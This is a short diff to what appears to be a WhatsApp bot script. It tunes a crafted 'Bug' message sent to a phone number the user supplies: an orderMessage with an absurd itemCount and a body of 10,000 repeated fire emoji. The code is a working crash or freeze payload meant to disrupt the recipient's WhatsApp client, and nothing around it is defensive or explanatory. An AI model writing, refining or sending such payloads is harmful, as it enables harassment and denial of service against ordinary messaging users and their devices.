@@ -9,7 +9,7 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Hai Kak', 'co
   },
   message: {
    orderMessage: {
-    itemCount: 999999999999999999999999999999999999, // Bug
+    itemCount: 9999999, // Bug
     status: 1,
     surface: 1,
     message: '🔥'.repeat(10000),
